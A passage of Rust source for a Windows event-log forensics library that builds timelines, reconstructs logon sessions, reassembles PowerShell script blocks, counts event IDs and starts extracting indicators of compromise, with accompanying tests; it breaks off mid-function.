//! Structured field analysis of Windows Event Log records.
//!
//! Builds on the `evtx` crate (full BinXml parser) to extract per-event
//! fields — event ID, logon session LUIDs, PowerShell script block text,
//! event frequency distributions — from intact or reconstructed EVTX files.
//!
//! For corrupt or cleared EVTX files, first reconstruct with
//! `winevt_carver::carve_from_file` + `winevt_writer::records_to_evtx`,
//! then pass the reconstructed path here.

use std::collections::HashMap;
use std::path::Path;
use std::sync::OnceLock;
use thiserror::Error;

// Re-export semantic event types and the unified enum from forensicnomicon.
pub use forensicnomicon::evtx::{
    DefenderEvent, EvtxEvent, LateralMovementEvent, ProcessExecution, RdpSessionEvent,
    ScheduledTask, SmbAccessEvent, WmiEvent,
};

// ── Error type ────────────────────────────────────────────────────────────────

#[derive(Error, Debug)]
pub enum AnalyzeError {
    #[error("I/O error: {0}")]
    Io(#[from] std::io::Error),
    #[error("EVTX parse error: {0}")]
    Parse(String),
    #[error("unknown hunt name: '{0}'")]
    UnknownHunt(String),
}

// ── Public types ──────────────────────────────────────────────────────────────

/// A single timeline entry: one event extracted from an EVTX file.
#[derive(Debug, Clone, serde::Serialize)]
pub struct TimelineEntry {
    /// Record sequence number from the EVTX chunk header.
    pub record_id: u64,
    /// ISO-8601 UTC timestamp, e.g. `"2017-12-08T12:34:56.000000Z"`.
    pub timestamp: String,
    /// Windows Event ID (the numeric code in `<System><EventID>`).
    pub event_id: u32,
    /// Severity level (0 = LogAlways, 1 = Critical, 2 = Error, 3 = Warning,
    /// 4 = Information, 5 = Verbose). `None` when the field cannot be parsed.
    pub level: Option<u8>,
    /// Log channel name, e.g. `"Security"`.
    pub channel: Option<String>,
    /// Hostname that generated the event.
    pub computer: Option<String>,
    /// ETW provider GUID or friendly name.
    pub provider: Option<String>,
}

/// A reconstructed Windows logon session, assembled from EID 4624 (logon)
/// and EID 4634/4647 (logoff) events.
#[derive(Debug, Clone, serde::Serialize)]
pub struct LogonSession {
    /// Target logon ID (LUID) as a hex string, e.g. `"0x3e7"`.
    pub logon_id: String,
    /// Target username.
    pub username: String,
    /// Target domain.
    pub domain: String,
    /// Logon type (2=Interactive, 3=Network, 10=RemoteInteractive, …).
    pub logon_type: u32,
    /// Source IP address, if present (network logons).
    pub ip_address: Option<String>,
    /// Logon timestamp (ISO-8601).
    pub logon_time: Option<String>,
    /// Logoff timestamp (ISO-8601). `None` if session was still open at log end.
    pub logoff_time: Option<String>,
    /// Session duration in seconds, if both logon and logoff are known.
    pub duration_secs: Option<i64>,
}

/// A reassembled PowerShell script block, reconstructed from one or more
/// EID 4104 (Script Block Logging) events sharing a `ScriptBlockId`.
#[derive(Debug, Clone, serde::Serialize)]
pub struct ScriptBlock {
    /// GUID that groups all parts of this script block, e.g.
    /// `"12345678-abcd-ef01-2345-6789abcdef01"`.
    pub script_block_id: String,
    /// Fully reassembled script text (parts joined in MessageNumber order).
    pub text: String,
    /// `<Path>` field from the event, when a script file path is logged.
    pub path: Option<String>,
    /// Number of EID 4104 fragments consumed to assemble this block.
    pub parts: u32,
}

/// Event ID frequency entry.
#[derive(Debug, Clone, serde::Serialize)]
pub struct EventFrequency {
    /// Windows Event ID.
    pub event_id: u32,
    /// How many times this event ID appeared.
    pub count: usize,
}

/// Frequency distribution of events in an EVTX file.
#[derive(Debug, Clone, serde::Serialize)]
pub struct FrequencyReport {
    /// Total number of events parsed.
    pub total_events: usize,
    /// Per-event-ID counts, sorted by count descending.
    pub by_event_id: Vec<EventFrequency>,
}

// ── Helper: extract EventID from evtx JSON value ──────────────────────────────

/// Extract the integer EventID from the `Event.System.EventID` field.
///
/// The `evtx` crate may represent this as:
/// - `4624` (bare integer)
/// - `{"#text": 4624, "#attributes": {"Qualifiers": 0}}` (with Qualifiers)
fn event_id_from_system(system: &serde_json::Value) -> Option<u32> {
    let raw = system.get("EventID")?;
    if let Some(n) = raw.as_u64() {
        return Some(n as u32);
    }
    // Object form: { "#text": N, ... }
    raw.get("#text")
        .and_then(serde_json::Value::as_u64)
        .map(|n| n as u32)
}

/// Extract a string field from `EventData` by name.
/// Read a string field from EventData, handling both EVTX serialization shapes:
///
/// 1. Named-attribute format (Security log, most audit events):
///    `{"Data": [{"@Name": "key", "#text": "value"}, ...]}`
/// 2. Named-element format (Sysmon EID 1, PowerShell EID 4104, etc.):
///    `{"Image": "value", "ScriptBlockText": "..."}`
///
/// The two shapes come from how the provider defines its `<template>` in the
/// manifest: `<Data Name="…">` serializes as shape 1; bare `<Image>` elements
/// serialize as shape 2.
fn event_data_str<'a>(event_data: &'a serde_json::Value, key: &str) -> Option<&'a str> {
    // Shape 1: named-attribute array
    if let Some(arr) = event_data.get("Data").and_then(|d| d.as_array()) {
        if let Some(hit) = arr.iter().find_map(|item| {
            if item.get("@Name")?.as_str()? == key {
                item.get("#text").and_then(|v| v.as_str())
            } else {
                None
            }
        }) {
            return Some(hit);
        }
    }
    // Shape 2: flat named-element object (Sysmon, PowerShell, WMI-Activity…)
    event_data.get(key)?.as_str()
}

/// Read a string field from Sysmon EventData (flat object format).
fn sysmon_str<'a>(event_data: &'a serde_json::Value, key: &str) -> Option<&'a str> {
    event_data.get(key)?.as_str()
}

/// Read an integer PID from Sysmon EventData (stored as JSON number, not hex).
fn sysmon_pid(event_data: &serde_json::Value, key: &str) -> u64 {
    event_data.get(key).and_then(|v| v.as_u64()).unwrap_or(0)
}

// ── Public functions ──────────────────────────────────────────────────────────

/// Parse an EVTX file and return all events sorted by timestamp.
///
/// Records with unparseable timestamps are included with an empty string
/// timestamp and sorted to the end.
pub fn timeline(path: &Path) -> Result<Vec<TimelineEntry>, AnalyzeError> {
    // Verify path is readable before handing to the evtx crate (gives a
    // friendlier error via our AnalyzeError::Io variant).
    let _ = std::fs::metadata(path).map_err(AnalyzeError::Io)?;

    let mut parser =
        evtx::EvtxParser::from_path(path).map_err(|e| AnalyzeError::Parse(e.to_string()))?;

    let mut entries: Vec<TimelineEntry> = Vec::new();
    for result in parser.records_json_value() {
        let record = match result {
            Ok(r) => r,
            Err(_) => continue, // skip unparseable records
        };
        let system = record.data.get("Event").and_then(|e| e.get("System"));

        let event_id = system.and_then(event_id_from_system).unwrap_or(0);

        let level = system
            .and_then(|s| s.get("Level"))
            .and_then(serde_json::Value::as_u64)
            .map(|n| n as u8);

        let channel = system
            .and_then(|s| s.get("Channel"))
            .and_then(serde_json::Value::as_str)
            .map(str::to_owned);

        let computer = system
            .and_then(|s| s.get("Computer"))
            .and_then(serde_json::Value::as_str)
            .map(str::to_owned);

        let provider = system
            .and_then(|s| s.get("Provider"))
            .and_then(|p| {
                // Provider can be {"@Name": "...", "@Guid": "..."}
                p.get("@Name").or_else(|| p.get("@Guid"))
            })
            .and_then(serde_json::Value::as_str)
            .map(str::to_owned);

        entries.push(TimelineEntry {
            record_id: record.event_record_id,
            timestamp: record.timestamp.to_string(),
            event_id,
            level,
            channel,
            computer,
            provider,
        });
    }

    // Sort by timestamp string (ISO-8601 sorts lexicographically)
    entries.sort_by(|a, b| a.timestamp.cmp(&b.timestamp));
    Ok(entries)
}

/// Reconstruct logon sessions from EID 4624 / 4634 / 4647 events.
///
/// Sessions are keyed on the `TargetLogonId` LUID field.  Logoff events
/// (EID 4634 and 4647) are matched to the most recent logon with the
/// same `TargetLogonId`.  Sessions with no matching logoff have
/// `logoff_time = None`.
pub fn sessions(path: &Path) -> Result<Vec<LogonSession>, AnalyzeError> {
    let _ = std::fs::metadata(path).map_err(AnalyzeError::Io)?;

    let mut parser =
        evtx::EvtxParser::from_path(path).map_err(|e| AnalyzeError::Parse(e.to_string()))?;

    // logon_id → LogonSession (open sessions)
    let mut open: HashMap<String, LogonSession> = HashMap::new();
    // Completed sessions (logoff matched)
    let mut closed: Vec<LogonSession> = Vec::new();
    // Preserve insertion order for open sessions
    let mut insertion_order: Vec<String> = Vec::new();

    for result in parser.records_json_value() {
        let record = match result {
            Ok(r) => r,
            Err(_) => continue,
        };
        let event = &record.data;
        let system = match event.get("Event").and_then(|e| e.get("System")) {
            Some(s) => s,
            None => continue,
        };
        let event_id = match event_id_from_system(system) {
            Some(id) => id,
            None => continue,
        };
        let ts = record.timestamp.to_string();
        let event_data = event.get("Event").and_then(|e| e.get("EventData"));

        match event_id {
            // EID 4624 — An account was successfully logged on
            4624 => {
                let ed = match event_data {
                    Some(d) => d,
                    None => continue,
                };
                let logon_id = event_data_str(ed, "TargetLogonId")
                    .unwrap_or("-")
                    .to_owned();
                let username = event_data_str(ed, "TargetUserName")
                    .unwrap_or("-")
                    .to_owned();
                let domain = event_data_str(ed, "TargetDomainName")
                    .unwrap_or("-")
                    .to_owned();
                let logon_type = event_data_str(ed, "LogonType")
                    .and_then(|s| s.parse().ok())
                    .unwrap_or(0);
                let ip_raw = event_data_str(ed, "IpAddress").map(str::to_owned);
                let ip_address = ip_raw.filter(|ip| ip != "-" && !ip.is_empty());

                let session = LogonSession {
                    logon_id: logon_id.clone(),
                    username,
                    domain,
                    logon_type,
                    ip_address,
                    logon_time: Some(ts),
                    logoff_time: None,
                    duration_secs: None,
                };
                if !open.contains_key(&logon_id) {
                    insertion_order.push(logon_id.clone());
                }
                open.insert(logon_id, session);
            }
            // EID 4634 — An account was logged off
            // EID 4647 — User initiated logoff
            4634 | 4647 => {
                let ed = match event_data {
                    Some(d) => d,
                    None => continue,
                };
                let logon_id = match event_data_str(ed, "TargetLogonId") {
                    Some(id) => id.to_owned(),
                    None => continue,
                };
                if let Some(mut session) = open.remove(&logon_id) {
                    session.logoff_time = Some(ts.clone());
                    // Compute duration using jiff::Timestamp arithmetic
                    if let (Some(logon), Some(logoff)) = (
                        session.logon_time.as_deref(),
                        session.logoff_time.as_deref(),
                    ) {
                        if let (Ok(t0), Ok(t1)) = (
                            logon.parse::<jiff::Timestamp>(),
                            logoff.parse::<jiff::Timestamp>(),
                        ) {
                            let d = t1.duration_since(t0).as_secs();
                            session.duration_secs = Some(d);
                        }
                    }
                    closed.push(session);
                    insertion_order.retain(|id| id != &logon_id);
                }
            }
            _ => {}
        }
    }

    // Append still-open sessions in insertion order
    let mut result = closed;
    for id in &insertion_order {
        if let Some(s) = open.remove(id) {
            result.push(s);
        }
    }
    Ok(result)
}

/// Correlate logon sessions across **multiple** EVTX files.
///
/// Unlike [`sessions`] (which is file-scoped), this function merges raw
/// 4624/4634/4647 events from all supplied paths, sorts them by timestamp,
/// and then runs the logon/logoff correlation state machine once — so a
/// session whose logon lands in one file and whose logoff lands in another
/// is correctly paired and its duration computed.
///
/// Returns `Err` if **every** path is unreadable.  Paths that cannot be
/// parsed are silently skipped so a corrupt EVTX in a directory does not
/// abort the entire scan.
///
/// Passing an empty slice returns `Ok(vec![])`.
pub fn sessions_multi(paths: &[&Path]) -> Result<Vec<LogonSession>, AnalyzeError> {
    if paths.is_empty() {
        return Ok(Vec::new());
    }

    // Collect (timestamp_str, event_id, event_data_json) triples from all files.
    struct RawEvent {
        timestamp: String,
        event_id: u32,
        data: serde_json::Value,
    }

    let mut all_raw: Vec<RawEvent> = Vec::new();
    let mut any_ok = false;

    for &path in paths {
        match evtx::EvtxParser::from_path(path) {
            Err(_) => continue,
            Ok(mut parser) => {
                any_ok = true;
                for result in parser.records_json_value() {
                    let record = match result { Ok(r) => r, Err(_) => continue };
                    let system = record.data.get("Event").and_then(|e| e.get("System"));
                    let event_id = match system.and_then(event_id_from_system) {
                        Some(id) if matches!(id, 4624 | 4634 | 4647) => id,
                        _ => continue,
                    };
                    all_raw.push(RawEvent {
                        timestamp: record.timestamp.to_string(),
                        event_id,
                        data: record.data,
                    });
                }
            }
        }
    }

    if !any_ok {
        return Err(AnalyzeError::Io(std::io::Error::new(
            std::io::ErrorKind::NotFound,
            "none of the supplied paths could be opened",
        )));
    }

    // Sort by timestamp so the correlation state machine sees events in order.
    all_raw.sort_by(|a, b| a.timestamp.cmp(&b.timestamp));

    // Run the same correlation logic as sessions().
    let mut open: HashMap<String, LogonSession> = HashMap::new();
    let mut closed: Vec<LogonSession> = Vec::new();
    let mut insertion_order: Vec<String> = Vec::new();

    for raw in &all_raw {
        let ed = match raw.data.get("Event").and_then(|e| e.get("EventData")) {
            Some(d) => d,
            None => continue,
        };
        match raw.event_id {
            4624 => {
                let logon_id = event_data_str(ed, "TargetLogonId").unwrap_or("-").to_owned();
                let username  = event_data_str(ed, "TargetUserName").unwrap_or("-").to_owned();
                let domain    = event_data_str(ed, "TargetDomainName").unwrap_or("-").to_owned();
                let logon_type = event_data_str(ed, "LogonType")
                    .and_then(|s| s.parse().ok()).unwrap_or(0);
                let ip_address = event_data_str(ed, "IpAddress")
                    .map(str::to_owned)
                    .filter(|ip| ip != "-" && !ip.is_empty());
                let session = LogonSession {
                    logon_id: logon_id.clone(), username, domain, logon_type,
                    ip_address, logon_time: Some(raw.timestamp.clone()),
                    logoff_time: None, duration_secs: None,
                };
                if !open.contains_key(&logon_id) {
                    insertion_order.push(logon_id.clone());
                }
                open.insert(logon_id, session);
            }
            4634 | 4647 => {
                let logon_id = match event_data_str(ed, "TargetLogonId") {
                    Some(id) => id.to_owned(),
                    None => continue,
                };
                if let Some(mut session) = open.remove(&logon_id) {
                    session.logoff_time = Some(raw.timestamp.clone());
                    if let (Some(logon), Some(logoff)) =
                        (session.logon_time.as_deref(), session.logoff_time.as_deref())
                    {
                        if let (Ok(t0), Ok(t1)) = (
                            logon.parse::<jiff::Timestamp>(),
                            logoff.parse::<jiff::Timestamp>(),
                        ) {
                            session.duration_secs = Some(t1.duration_since(t0).as_secs());
                        }
                    }
                    closed.push(session);
                    insertion_order.retain(|id| id != &logon_id);
                }
            }
            _ => {}
        }
    }

    let mut result = closed;
    for id in &insertion_order {
        if let Some(s) = open.remove(id) {
            result.push(s);
        }
    }
    Ok(result)
}

/// Build a merged logon graph from **multiple** EVTX files.
///
/// Calls [`logon_graph`] on each readable path and merges the results:
/// nodes are unioned, edges with the same `(source, target, logon_type)`
/// tuple have their counts summed.  Paths that fail to parse are skipped.
///
/// Passing an empty slice returns an empty graph (not an error).
pub fn logon_graph_multi(paths: &[&Path]) -> Result<LogonGraph, AnalyzeError> {
    let mut node_set = std::collections::HashSet::new();
    let mut edge_map: HashMap<(String, String, u32), usize> = HashMap::new();

    for &path in paths {
        if let Ok(g) = logon_graph(path) {
            for node in g.nodes { node_set.insert(node); }
            for edge in g.edges {
                *edge_map.entry((edge.source, edge.target, edge.logon_type))
                    .or_insert(0) += edge.count;
            }
        }
    }

    let mut nodes: Vec<String> = node_set.into_iter().collect();
    nodes.sort();
    let mut edges: Vec<LogonEdge> = edge_map.into_iter()
        .map(|((source, target, logon_type), count)| LogonEdge { source, target, logon_type, count })
        .collect();
    edges.sort_by(|a, b| a.source.cmp(&b.source).then(a.target.cmp(&b.target)));

    Ok(LogonGraph { nodes, edges })
}

/// Reassemble PowerShell script blocks from EID 4104 events.
///
/// Groups events by `ScriptBlockId`, sorts fragments by `MessageNumber`,
/// and concatenates `ScriptBlockText` values.  Returns one `ScriptBlock`
/// per unique GUID, in the order the first fragment was observed.
pub fn powershell_blocks(path: &Path) -> Result<Vec<ScriptBlock>, AnalyzeError> {
    let _ = std::fs::metadata(path).map_err(AnalyzeError::Io)?;

    let mut parser =
        evtx::EvtxParser::from_path(path).map_err(|e| AnalyzeError::Parse(e.to_string()))?;

    // script_block_id → (path, Vec<(message_number, text)>)
    type BlockEntry = (Option<String>, Vec<(u32, String)>);
    let mut blocks: HashMap<String, BlockEntry> = HashMap::new();
    let mut insertion_order: Vec<String> = Vec::new();

    for result in parser.records_json_value() {
        let record = match result {
            Ok(r) => r,
            Err(_) => continue,
        };
        let event = &record.data;
        let system = match event.get("Event").and_then(|e| e.get("System")) {
            Some(s) => s,
            None => continue,
        };
        if event_id_from_system(system) != Some(4104) {
            continue;
        }
        let event_data = match event.get("Event").and_then(|e| e.get("EventData")) {
            Some(d) => d,
            None => continue,
        };

        let script_id = match event_data_str(event_data, "ScriptBlockId") {
            Some(id) => id.to_owned(),
            None => continue,
        };
        let text = event_data_str(event_data, "ScriptBlockText")
            .unwrap_or("")
            .to_owned();
        let msg_num: u32 = event_data_str(event_data, "MessageNumber")
            .and_then(|s| s.parse().ok())
            .unwrap_or(1);
        let script_path = event_data_str(event_data, "Path")
            .filter(|p| !p.is_empty())
            .map(str::to_owned);

        let entry = blocks.entry(script_id.clone()).or_insert_with(|| {
            insertion_order.push(script_id.clone());
            (script_path, Vec::new())
        });
        entry.1.push((msg_num, text));
    }

    let mut result = Vec::with_capacity(blocks.len());
    for id in insertion_order {
        if let Some((path_val, mut parts)) = blocks.remove(&id) {
            parts.sort_by_key(|(n, _)| *n);
            let count = parts.len() as u32;
            let text = parts
                .into_iter()
                .map(|(_, t)| t)
                .collect::<Vec<_>>()
                .join("");
            result.push(ScriptBlock {
                script_block_id: id,
                text,
                path: path_val,
                parts: count,
            });
        }
    }
    Ok(result)
}

/// Compute a frequency distribution of event IDs.
///
/// Useful for spotting bursts of a single event ID that may indicate
/// brute-force attacks, log flooding, or other anomalies.
pub fn frequency(path: &Path) -> Result<FrequencyReport, AnalyzeError> {
    let _ = std::fs::metadata(path).map_err(AnalyzeError::Io)?;

    let mut parser =
        evtx::EvtxParser::from_path(path).map_err(|e| AnalyzeError::Parse(e.to_string()))?;

    let mut counts: HashMap<u32, usize> = HashMap::new();
    let mut total = 0usize;

    for result in parser.records_json_value() {
        let record = match result {
            Ok(r) => r,
            Err(_) => continue,
        };
        total += 1;
        let event_id = record
            .data
            .get("Event")
            .and_then(|e| e.get("System"))
            .and_then(event_id_from_system)
            .unwrap_or(0);
        *counts.entry(event_id).or_insert(0) += 1;
    }

    let mut by_event_id: Vec<EventFrequency> = counts
        .into_iter()
        .map(|(event_id, count)| EventFrequency { event_id, count })
        .collect();
    by_event_id.sort_by(|a, b| b.count.cmp(&a.count).then(a.event_id.cmp(&b.event_id)));

    Ok(FrequencyReport {
        total_events: total,
        by_event_id,
    })
}

// ── Unified extraction ────────────────────────────────────────────────────────

/// Extract every supported semantic event type from an EVTX file and return
/// them as a timestamp-sorted `Vec<EvtxEvent>`.
///
/// Each extractor is called independently; a failure in one (e.g. no matching
/// EIDs) is silently skipped so the others can still contribute results.
pub fn extract_all(path: &Path) -> Result<Vec<EvtxEvent>, AnalyzeError> {
    // Verify the path is accessible before fanning out.
    let _ = std::fs::metadata(path).map_err(AnalyzeError::Io)?;

    let mut events: Vec<EvtxEvent> = Vec::new();

    macro_rules! push_all {
        ($fn:ident, $variant:ident) => {
            if let Ok(items) = $fn(path) {
                events.extend(items.into_iter().map(EvtxEvent::$variant));
            }
        };
    }

    push_all!(lateral_movement, LateralMovement);
    push_all!(rdp_sessions, RdpSession);
    push_all!(smb_access, SmbAccess);
    push_all!(defender_events, Defender);
    push_all!(wmi_events, Wmi);
    push_all!(scheduled_tasks, ScheduledTask);
    push_all!(process_cmdlines, ProcessExecution);

    events.sort_unstable_by(|a, b| a.timestamp().cmp(b.timestamp()));

    Ok(events)
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    // ── extract_all ───────────────────────────────────────────────────────────

    #[test]
    fn extract_all_nonexistent_path_returns_error() {
        let result = extract_all(Path::new("/nonexistent/security.evtx"));
        assert!(result.is_err());
    }

    #[test]
    fn extract_all_returns_evtx_events() {
        let path = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join(
            "../../tests/data/hayabusa-sample-evtx/DeepBlueCLI/new-user-creation.evtx",
        );
        if !path.exists() {
            eprintln!("SKIP: corpus file not found");
            return;
        }
        let events = extract_all(&path).expect("extract_all should succeed");
        // File has Security events; at least some should be extracted.
        assert!(!events.is_empty(), "expected at least one extracted event");
    }

    #[test]
    fn extract_all_results_are_sorted_by_timestamp() {
        let path = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join(
            "../../tests/data/hayabusa-sample-evtx/DeepBlueCLI/new-user-creation.evtx",
        );
        if !path.exists() {
            eprintln!("SKIP: corpus file not found");
            return;
        }
        let events = extract_all(&path).expect("extract_all should succeed");
        let timestamps: Vec<&str> = events.iter().map(|e| e.timestamp()).collect();
        let mut sorted = timestamps.clone();
        sorted.sort_unstable();
        assert_eq!(timestamps, sorted, "events must be in ascending timestamp order");
    }

    #[test]
    fn extract_all_type_is_vec_of_evtx_event() {
        // Compile-time type assertion — fails if return type changes.
        #[allow(dead_code)]
        fn _assert(p: &Path) -> Result<Vec<EvtxEvent>, AnalyzeError> {
            extract_all(p)
        }
    }

    // ── Error paths ───────────────────────────────────────────────────────────

    #[test]
    fn timeline_nonexistent_path_returns_error() {
        let result = timeline(Path::new("/nonexistent/security.evtx"));
        assert!(result.is_err(), "expected error for nonexistent path");
    }

    #[test]
    fn sessions_nonexistent_path_returns_error() {
        let result = sessions(Path::new("/nonexistent/security.evtx"));
        assert!(result.is_err(), "expected error for nonexistent path");
    }

    #[test]
    fn powershell_blocks_nonexistent_path_returns_error() {
        let result = powershell_blocks(Path::new("/nonexistent/powershell.evtx"));
        assert!(result.is_err(), "expected error for nonexistent path");
    }

    #[test]
    fn frequency_nonexistent_path_returns_error() {
        let result = frequency(Path::new("/nonexistent/security.evtx"));
        assert!(result.is_err(), "expected error for nonexistent path");
    }

    // ── Type shape tests ──────────────────────────────────────────────────────

    #[test]
    fn timeline_entry_fields_are_accessible() {
        let e = TimelineEntry {
            record_id: 42,
            timestamp: "2017-12-08T12:00:00.000000Z".to_string(),
            event_id: 4624,
            level: Some(0),
            channel: Some("Security".to_string()),
            computer: Some("WORKSTATION".to_string()),
            provider: Some("Microsoft-Windows-Security-Auditing".to_string()),
        };
        assert_eq!(e.record_id, 42);
        assert_eq!(e.event_id, 4624);
        assert_eq!(e.level, Some(0));
    }

    #[test]
    fn logon_session_fields_are_accessible() {
        let s = LogonSession {
            logon_id: "0x3e7".to_string(),
            username: "SYSTEM".to_string(),
            domain: "NT AUTHORITY".to_string(),
            logon_type: 0,
            ip_address: None,
            logon_time: None,
            logoff_time: None,
            duration_secs: None,
        };
        assert_eq!(s.logon_id, "0x3e7");
        assert_eq!(s.logon_type, 0);
        assert!(s.ip_address.is_none());
        assert!(s.duration_secs.is_none());
    }

    #[test]
    fn script_block_fields_are_accessible() {
        let b = ScriptBlock {
            script_block_id: "00000000-0000-0000-0000-000000000000".to_string(),
            text: "Write-Host 'hello'".to_string(),
            path: None,
            parts: 1,
        };
        assert_eq!(b.parts, 1);
        assert!(b.path.is_none());
    }

    #[test]
    fn frequency_report_fields_are_accessible() {
        let r = FrequencyReport {
            total_events: 100,
            by_event_id: vec![EventFrequency {
                event_id: 4624,
                count: 50,
            }],
        };
        assert_eq!(r.total_events, 100);
        assert_eq!(r.by_event_id[0].event_id, 4624);
        assert_eq!(r.by_event_id[0].count, 50);
    }

    // ── Serde ─────────────────────────────────────────────────────────────────

    #[test]
    fn timeline_entry_serializes_to_json() {
        let e = TimelineEntry {
            record_id: 1,
            timestamp: "2017-12-08T12:00:00.000000Z".to_string(),
            event_id: 4624,
            level: Some(0),
            channel: Some("Security".to_string()),
            computer: None,
            provider: None,
        };
        let json = serde_json::to_string(&e).expect("serialize TimelineEntry");
        assert!(json.contains("4624"));
        assert!(json.contains("Security"));
    }

    #[test]
    fn logon_session_serializes_to_json() {
        let s = LogonSession {
            logon_id: "0x3e7".to_string(),
            username: "Administrator".to_string(),
            domain: "WORKGROUP".to_string(),
            logon_type: 3,
            ip_address: Some("192.168.1.1".to_string()),
            logon_time: Some("2017-12-08T12:00:00Z".to_string()),
            logoff_time: None,
            duration_secs: None,
        };
        let json = serde_json::to_string(&s).expect("serialize LogonSession");
        assert!(json.contains("0x3e7"));
        assert!(json.contains("192.168.1.1"));
    }

    // ── Fox-it integration (skip when absent) ─────────────────────────────────

    fn foxitdata_path(filename: &str) -> std::path::PathBuf {
        let mut p = std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"));
        p.pop(); // crates/
        p.pop(); // workspace root
        p.join("tests/data/fox-it-danderspritz").join(filename)
    }

    macro_rules! require_foxitdata {
        ($filename:expr) => {{
            let p = foxitdata_path($filename);
            if !p.exists() {
                eprintln!(
                    "SKIP: {} not found — run download instructions",
                    p.display()
                );
                return;
            }
            p
        }};
    }

    #[test]
    fn pre_security_timeline_returns_entries() {
        let path = require_foxitdata!("pre-Security.evtx");
        let entries = timeline(&path).expect("timeline on pre-Security.evtx");
        assert!(!entries.is_empty(), "expected some timeline entries");
    }

    #[test]
    fn pre_security_timeline_sorted_by_timestamp() {
        let path = require_foxitdata!("pre-Security.evtx");
        let entries = timeline(&path).expect("timeline on pre-Security.evtx");
        for i in 1..entries.len() {
            assert!(
                entries[i].timestamp >= entries[i - 1].timestamp,
                "timeline not sorted at index {i}: {} < {}",
                entries[i].timestamp,
                entries[i - 1].timestamp
            );
        }
    }

    #[test]
    fn pre_security_timeline_has_event_ids() {
        let path = require_foxitdata!("pre-Security.evtx");
        let entries = timeline(&path).expect("timeline on pre-Security.evtx");
        assert!(
            entries.iter().any(|e| e.event_id > 0),
            "expected non-zero event IDs in timeline"
        );
    }

    #[test]
    fn pre_security_frequency_total_matches_timeline_count() {
        let path = require_foxitdata!("pre-Security.evtx");
        let entries = timeline(&path).expect("timeline");
        let report = frequency(&path).expect("frequency");
        assert_eq!(
            report.total_events,
            entries.len(),
            "frequency total_events should equal timeline entry count"
        );
    }

    #[test]
    fn pre_security_sessions_returns_sessions() {
        let path = require_foxitdata!("pre-Security.evtx");
        let result = sessions(&path).expect("sessions on pre-Security.evtx");
        // Security.evtx should have at least one logon session
        assert!(!result.is_empty(), "expected at least one logon session");
    }

    #[test]
    fn pre_security_sessions_have_logon_ids() {
        let path = require_foxitdata!("pre-Security.evtx");
        let result = sessions(&path).expect("sessions on pre-Security.evtx");
        for s in &result {
            assert!(!s.logon_id.is_empty(), "logon_id should not be empty");
        }
    }
}

// ── IOC extraction types ──────────────────────────────────────────────────────

/// Category of an extracted indicator of compromise.
#[derive(Debug, Clone, PartialEq, Eq, Hash, serde::Serialize)]
#[serde(rename_all = "snake_case")]
pub enum IocKind {
    /// IPv4 or IPv6 address.
    IpAddress,
    /// Domain name (e.g. `evil.example.com`).
    Domain,
    /// MD5 hash (32 hex chars).
    Md5,
    /// SHA-1 hash (40 hex chars).
    Sha1,
    /// SHA-256 hash (64 hex chars).
    Sha256,
    /// Windows filesystem path (e.g. `C:\Windows\System32\cmd.exe`).
    FilePath,
}

/// A single extracted IOC with observation metadata.
#[derive(Debug, Clone, serde::Serialize)]
pub struct Ioc {
    /// The IOC value (IP, domain, hash, or path string).
    pub value: String,
    /// Category of this indicator.
    pub kind: IocKind,
    /// Number of events that contained this value.
    pub count: usize,
    /// ISO-8601 timestamp of the first event that contained it.
    pub first_seen: Option<String>,
    /// ISO-8601 timestamp of the last event that contained it.
    pub last_seen: Option<String>,
    /// Record IDs of the events that contained this value (capped at 10).
    pub record_ids: Vec<u64>,
}

/// All IOCs extracted from an EVTX file.
#[derive(Debug, Clone, serde::Serialize)]
pub struct IocReport {
    /// Total events scanned.
    pub events_scanned: usize,
    /// All extracted IOCs, sorted by count descending.
    pub iocs: Vec<Ioc>,
}

// ── IOC regex patterns ────────────────────────────────────────────────────────

struct IocPatterns {
    ipv4: regex::Regex,
    sha256: regex::Regex,
    sha1: regex::Regex,
    md5: regex::Regex,
    filepath: regex::Regex,
}

static IOC_PATTERNS: OnceLock<IocPatterns> = OnceLock::new();

fn ioc_patterns() -> &'static IocPatterns {
    IOC_PATTERNS.get_or_init(|| IocPatterns {
        // IPv4 — four dotted octets (0-255 each); reject private-only 127.0.0.1 style
        ipv4: regex::Regex::new(
            r"\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\b",
        )
        .unwrap(),
        // SHA-256: 64 hex chars
        sha256: regex::Regex::new(r"\b[0-9a-fA-F]{64}\b").unwrap(),
        // SHA-1: 40 hex chars
        sha1: regex::Regex::new(r"\b[0-9a-fA-F]{40}\b").unwrap(),
        // MD5: 32 hex chars
        md5: regex::Regex::new(r"\b[0-9a-fA-F]{32}\b").unwrap(),
        // Windows path: drive letter followed by backslash
        filepath: regex::Regex::new(r#"[A-Za-z]:\\[^\s"<>|?*\x00-\x1f]{2,}"#).unwrap(),
    })
}

/// Scan a JSON string for all IOC patterns, returning (kind, value) pairs.
///
/// The `\b` word-boundary anchors on hex patterns guarantee exact-length
/// matching: a 64-char hex string cannot match the 40-char SHA-1 pattern
/// because there is no word boundary in the middle of a hex sequence.
fn scan_for_iocs(text: &str) -> Vec<(IocKind, String)> {
    let p = ioc_patterns();
    let mut hits: Vec<(IocKind, String)> = Vec::new();

    for m in p.sha256.find_iter(text) {
        hits.push((IocKind::Sha256, m.as_str().to_ascii_lowercase()));
    }
    for m in p.sha1.find_iter(text) {
        hits.push((IocKind::Sha1, m.as_str().to_ascii_lowercase()));
    }
    for m in p.md5.find_iter(text) {
        hits.push((IocKind::Md5, m.as_str().to_ascii_lowercase()));
    }
    for m in p.ipv4.find_iter(text) {
        let s = m.as_str().to_owned();
        if s != "0.0.0.0" && s != "255.255.255.255" && s != "127.0.0.1" {
            hits.push((IocKind::IpAddress, s));
        }
    }
    for m in p.filepath.find_iter(text) {
        hits.push((IocKind::FilePath, m.as_str().to_owned()));
    }
    hits
}

/// Extract indicators of compromise from all string fields in an EVTX file.
///
/// Scans IPv4 addresses, MD5/SHA-1/SHA-256 hashes, and Windows
/// file paths from every event.  Results are deduplicated and sorted
/// by observation count (descending).
pub fn ioc_extract(path: &Path) -> Result<IocReport, AnalyzeError> {
    let _ = std::fs::metadata(path).map_err(AnalyzeError::Io)?;

    let mut parser =
